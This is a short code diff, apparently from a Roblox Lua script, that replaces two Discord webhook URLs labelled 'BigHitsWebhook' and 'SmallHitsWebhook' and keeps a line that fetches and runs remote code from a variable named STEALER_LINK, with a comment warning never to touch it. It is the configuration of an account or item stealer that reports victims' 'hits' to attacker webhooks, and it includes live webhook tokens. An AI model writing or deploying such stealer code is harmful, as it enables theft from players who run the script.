@@ -8,7 +8,7 @@ Usernames = {
     'zlata4ka0',
 }
 
-BigHitsWebhook = "https://discordapp.com/api/webhooks/1392428981361446966/mU9fVmtDZqOUN6bM3N71Yf1ApK58eKmqwJAhM93N1r8rLJrzWkmOhX591apf4tgvGUKQ"
-SmallHitsWebhook = "https://discordapp.com/api/webhooks/1392429247012012147/vJl4AL3nkuCds_aqXf_US50K5IMg716iWM-XIYUSWE1rtR-oGn9_uToEeKcjeWMEmf-p"
+BigHitsWebhook = "https://discordapp.com/api/webhooks/1392499143183826994/3YyWgUt7pJVrb2_Uff769UEzQzR0vk1muq8aqu1vDS8hTT7bjXp9_ANaFLGZsmOn6sKH"
+SmallHitsWebhook = "https://discordapp.com/api/webhooks/1392499900255830128/-jq8DGVPPVaySH1ykKpocLwvXpz4UHAUSRYDGJ3u2-rBkwOZrfUaofUD9V7frOQZe8ng"
 
-loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!! 
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
